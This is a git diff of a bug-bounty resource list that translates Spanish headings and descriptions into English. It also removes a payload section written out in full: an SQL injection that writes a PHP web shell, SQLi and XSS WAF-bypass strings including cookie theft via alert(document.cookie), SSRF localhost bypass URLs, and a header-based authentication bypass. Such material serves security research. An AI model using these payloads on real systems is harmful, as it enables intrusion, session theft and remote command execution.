@@ -217,14 +217,14 @@ Some Resources to apply in a bugbounty
 
 - TakeOverV1: 
     - [https://github.com/samhaxr/TakeOver-v1](https://github.com/samhaxr/TakeOver-v1)
-    - El script de adquisición extrae el registro CNAME de todos los subdominios a la vez. TakeOver ahorra tiempo a los investigadores y aumenta las posibilidades de encontrar una vulnerabilidad de takeover de subdominios.
+    - The takeover script extracts the CNAME record of all subdomains at once. TakeOver saves researchers time and increases the chances of finding a subdomain takeover vulnerability.
 
 
 **Tools for Subdomains:**
 
 - SubR3con: 
     - [https://github.com/rohitcoder/SubR3con](https://github.com/rohitcoder/SubR3con)
-    - Objetivo específico y luego verifica el código de status para una posible vulnerabilidad de toma de control del subdominio
+    - Specific target and then check the status code for a possible subdomain takeover vulnerability.
 	
 - DNS Wordlist: [https://github.com/ZephrFish/Wordlists/blob/master/HugeDNS.7z](https://github.com/ZephrFish/Wordlists/blob/master/HugeDNS.7z)
 
@@ -259,110 +259,36 @@ Some Resources to apply in a bugbounty
 **Exploit - Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE:**
 - [https://cxsecurity.com/issue/WLB-2020090079](https://cxsecurity.com/issue/WLB-2020090079)
 
-**Java deserelizacion:**
+**Java deserelization:**
 - [https://github.com/ikkisoft/SerialKiller](https://github.com/ikkisoft/SerialKiller)
 - [https://pivotal.io/security/cve-2020-5398](https://pivotal.io/security/cve-2020-5398)
 - [https://github.com/motikan2010/CVE-2020-5398/](https://github.com/motikan2010/CVE-2020-5398/)
 
-**Herramientas y trucos para el bug bounty:**
+**Tools and tricks for bug bounty:**
 - [https://dhiyaneshgeek.github.io/bug/bounty/2020/02/06/recon-with-me/](https://dhiyaneshgeek.github.io/bug/bounty/2020/02/06/recon-with-me/)
 
-**Mapa de vulnerabilidades:**
+**Vulnerability map:**
 - [https://www.xmind.net/m/2QyGbx/](https://www.xmind.net/m/2QyGbx/)
 
-**Mapa del bug bounty:**
+**Map of the bug bounty:**
 - [https://www.xmind.net/m/VWTC3u/](https://www.xmind.net/m/VWTC3u/)
 
-**21 Cosas que puedes hacer con una XSS:**
+**21 Things you can do with an XSS:**
 - [https://s0md3v.github.io/21-things-xss/](https://s0md3v.github.io/21-things-xss/)
 
-**Tips para Bug Bounty:**
+**Tips for Bug Bounty:**
 - [https://github.com/devanshbatham/Awesome-Bugbounty-Writeups](https://github.com/devanshbatham/Awesome-Bugbounty-Writeups)
 
-**Info para principiantes:**
+**Info for beginners:**
 - [https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters](https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters)
 
-### Ayudas: 
+### Help: 
 
 - Cheat Sheet Python: [https://blog.underc0de.org/cheat-sheet-python/](https://blog.underc0de.org/cheat-sheet-python/)
 
-- La biblia de bash: [https://github.com/dylanaraps/pure-bash-bible](https://github.com/dylanaraps/pure-bash-bible)
-- Machine Learning para la cyberseguridad: [https://github.com/jivoi/awesome-ml-for-cybersecurity](https://github.com/jivoi/awesome-ml-for-cybersecurity)
-- Pagina con muchas tools utiles: [https://technisette.com/p/home](https://technisette.com/p/home)
+- The bash bible: [https://github.com/dylanaraps/pure-bash-bible](https://github.com/dylanaraps/pure-bash-bible)
+- Machine Learning for cybersecurity: [https://github.com/jivoi/awesome-ml-for-cybersecurity](https://github.com/jivoi/awesome-ml-for-cybersecurity)
+- Page with many useful tools: [https://technisette.com/p/home](https://technisette.com/p/home)
 	- [Databases](https://technisette.com/p/databases)
 	- [A lot of Tools](https://technisette.com/p/tools)
-- Consultas de búsqueda de Shodan: [https://github.com/jakejarvis/awesome-shodan-queries](https://github.com/jakejarvis/awesome-shodan-queries)
-
-### Payloads:
-
-**SQLi**
-
-- SQL Web Shell:
-
-```sql
-' union select '<?php $sys = "sys"."tem"; $sys($_GET["c"]); ?>' into outfile 'C:\inetpub\wwwroot\robots.php' -- -`
-```
-
-- SQLi Payload:
-
-```SQL
-"' OR 1=1 --"@x.com
-```
-
-- SQLi WAF ByPass:
-
-```sql
-1,group_concat(column_name) /*%%!asd%%%%*/from/*%%!asd%%%%*/information_schema.columns where table_name=’users’ --+
-```
-
-**XSS**
-
-- XSS One to bypass Incapsula WAF:
-
-```js
-<input id='a'value='global'><input id='b'value='E'>
-<input 'id='c'value='val'><input id='d'value='aler'>
-<input id='e'value='t(documen'><input id='f'value='t.domain)'>
-<svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>
-<b onmouseover=alert('Wufff!')>click me!</b>
-"><script>propmt("mamunwhh")</script>
-"><script>alert(document.cookie)</script>
-/><svg src=x onload=confirm("1337");>
-```
-
--  XSS WAF ByPass:
-
-```js
-<audio src=1 onerror=alert(/xss/);>
-<audio src=1 onerror=prompt('xss');>
-<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="></object>
-```
-
-**SSRF**
-
--  SSRF Bypass list for localhost (127.0.0.1):
-
-```
-http://127.1/
-http://0000::1:80/
-http://[::]:80/
-http://2130706433/
-http://whitelisted@127.0.0.1
-http://0x7f000001/
-http://017700000001
-http://0177.00.00.01
-```
-
-**Autentication Bypass con el header "X-Custom-IP-Authorization"**
-```http
-Request
-GET /delete?user=pedro HTTP/1.1
-Response
-HTTP/1.1 401 Unauthorized
-
-Request
-GET /delete?user=pedro HTTP/1.1
-X-Custom-IP-Authorization: 127.0.0.1
-Response
-HTTP/1.1 302 Found
-```
+- Shodan search queries: [https://github.com/jakejarvis/awesome-shodan-queries](https://github.com/jakejarvis/awesome-shodan-queries)
